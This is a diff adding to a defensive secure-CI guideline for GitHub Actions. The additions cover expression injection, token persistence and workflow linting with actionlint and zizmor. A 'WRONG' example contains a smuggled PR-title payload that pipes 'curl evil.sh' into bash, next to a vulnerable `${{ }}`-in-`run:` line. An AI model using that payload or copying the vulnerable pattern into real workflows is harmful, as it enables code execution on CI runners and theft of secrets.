@@ -33,6 +33,21 @@ CI is the merge gate that makes the PR-flow real (SKILL.md Source Code Managemen
 - **Pin third-party actions by full commit SHA**, not a moving tag — `uses: actions/checkout@<40-char-sha>  # v4.x`. A tag like `@v4` is repointable; a compromised or retagged action then runs with your token (the supply-chain attack class that hit `tj-actions/changed-files`). First-party `actions/*` at a major tag is the *minimum* acceptable bar; SHA-pin everything for a commercial pipeline, and let Dependabot PR the bumps.
 - **Pin tool versions in the job, not "latest."** `setup-python` with an explicit `python-version` that **matches the Dockerfile and prod** (the engine pins 3.12 in CI to match the image, even though local dev runs 3.14 — a version skew between CI and prod is a class of "passes CI, breaks in prod" bug). Cache the toolchain (`cache: pip`).
 
+## Expression injection — never interpolate `${{ }}` into `run:`
+
+- **Never place a `${{ … }}` expression carrying externally-controlled data directly inside a `run:` block.** The runner substitutes the expression **before** the shell parses the script, so metacharacters in a PR title, branch name, issue body, commit message, or fork-supplied value execute as shell — the CI twin of SKILL.md's *Bash Command Injection Prevention* (`bash -c "… $var …"`), with the same fix shape:
+  ```yaml
+  # WRONG — a PR titled `"; curl evil.sh | bash; echo "` executes on the runner
+  - run: echo "${{ github.event.pull_request.title }}"
+
+  # CORRECT — bind to env: (data, not code), then reference the quoted shell variable
+  - env:
+      PR_TITLE: ${{ github.event.pull_request.title }}
+    run: echo "$PR_TITLE"
+  ```
+  The `env:` indirection means the value arrives as an environment variable the shell never re-parses. Treat *every* `github.event.*` / `github.head_ref` value as attacker-controlled; both gate tools below flag violations mechanically.
+- **`persist-credentials: false` on checkout for any job that never pushes** — the default persists `GITHUB_TOKEN` in `.git/config` for the whole job, where any later step or compromised tool can read it.
+
 ## Secrets in Actions
 
 - **Secrets come from the `secrets` context or an OIDC exchange — never hardcoded, never `echo`'d.** A secret printed to the log (even accidentally, via `set -x` or a debug `echo`) is leaked; Actions masks known secret values but not derived ones. SKILL.md's "never log secrets" applies to CI logs too.
@@ -42,6 +57,7 @@ CI is the merge gate that makes the PR-flow real (SKILL.md Source Code Managemen
 
 - **`bandit` as a gating step** (`-ll` HIGH/MEDIUM, `-r` over the source dirs). Document every `--skip` inline with *why* it's accepted (the engine CI skips B310 — all `urlopen`s hit fixed `https://` endpoints — and B108 — `/tmp/jobs` is intentional Cloud Run ephemeral storage). An undocumented skip is a hidden waiver.
 - **Lint + type-check as gating steps** (the non-security half of static analysis, SKILL.md *Type Annotations*). A `lint` job runs **`ruff check`** + **`ruff format --check`** (replaces flake8/black/isort); a `typecheck` job runs **`mypy --strict`** (or **`pyright`**) over the package. Both fail the PR. The skill mandates complete annotations — this is the gate that proves they hold; without it the mandate is unverified. For a large untyped legacy module, ratchet (gate touched modules; widen the include list over time) rather than a blanket ignore.
+- **The workflows themselves are gated: `actionlint` (correctness) + `zizmor` (security), merge-blocking.** Every repo with `.github/workflows/` runs both over those files in one gate script (CI and local, same script): `actionlint` catches schema/expression-type errors and shellchecks embedded `run:` blocks; `zizmor` catches template injection, unpinned `uses:`, credential persistence (`artipacked`), and dangerous `pull_request_target` patterns — the mechanized check behind the least-privilege/pinning/no-`${{ }}`-in-`run:` mandates above, which are otherwise review-only prose. Pin both (checksum-verify the `actionlint` binary; `zizmor` version-pinned, `ZIZMOR_OFFLINE=true` for determinism), and gate on the **tool's own exit status, never through a pipeline** — zizmor exits 10–14 to encode finding severity, so map "findings" and "tool error" explicitly (a naive `|| true` swallows both; a naive `set -e` conflates them). Worked example: this repo's `scripts/actions-lint.sh`.
 - **CodeQL** (GitHub's SAST) on a schedule + PRs for a commercial app — it catches the over-broad-token, injection, and data-flow issues `bandit` misses. Findings are tracked (e.g. "CodeQL #13"); resolve or explicitly dismiss-with-reason.
 - **Dependency review / Dependabot** on the lockfile and `requirements*.txt` (cross-ref `compliance.md` A03:2025 supply chain). Commit a `.github/dependabot.yml` covering *every* ecosystem (`pip`, `npm`, `github-actions`, `docker`), enable Dependabot alerts + security updates + secret-scanning/push-protection, and **keep the alert tab at zero** — every alert is triaged (bump-and-merge, or dismiss-with-reason), never left to pile up.
 - **A manifest-level dependency-audit gate (`pip-audit` / `npm audit` / `osv-scanner`), all severities, as a *required* check.** Wrap it in a `scripts/audit.sh` that CI and developers both run (the gate-script-shared-with-local pattern below), auditing **every** manifest — each `requirements*.txt` *and* `pyproject.toml` (`pip-audit .` project mode). This is **not redundant with the image Trivy scan**: an image scanner only sees packages that reach a built image and is usually floored at HIGH/CRITICAL, so it misses (1) MEDIUM/LOW advisories (still real on a hostile-input parser), (2) a manifest that's in no image (a legacy/dev requirements file), and (3) `pyproject`↔`requirements` **drift**. The manifest audit closes all three; keep parallel manifests in lockstep so a bump can't land in one file and rot in another. (Trivy/grype on the *image* and `trivy fs`/`osv-scanner` on the *tree* are complements, not substitutes — state which blind spot each covers.)
@@ -97,8 +113,8 @@ your pinned image — pin the image *and* the Xcode version via `xcode-select`/`
 ## Test cases (what to verify about the pipeline itself)
 
 - **A deliberately-broken PR is rejected:** a failing test, a `bandit` HIGH, a malformed compose file, or a cross-tenant RLS leak must each turn the corresponding job red and block the merge — verify the gate actually gates.
-- **The `permissions` block is minimal:** assert (review or a policy check) that no job holds write scopes it doesn't use.
-- **Actions are pinned:** a check (or review discipline) that no `uses:` references a floating `@main`/`@master`.
+- **The `permissions` block is minimal:** `zizmor` (the `excessive-permissions` audit, via the workflow-lint gate above) asserts no job holds write scopes it doesn't use — mechanized, not review-only.
+- **Actions are pinned:** `zizmor`'s `unpinned-uses` audit fails any `uses:` on a floating ref — mechanized, not review-only.
 
 ## Deploy stage (when you add it)
 
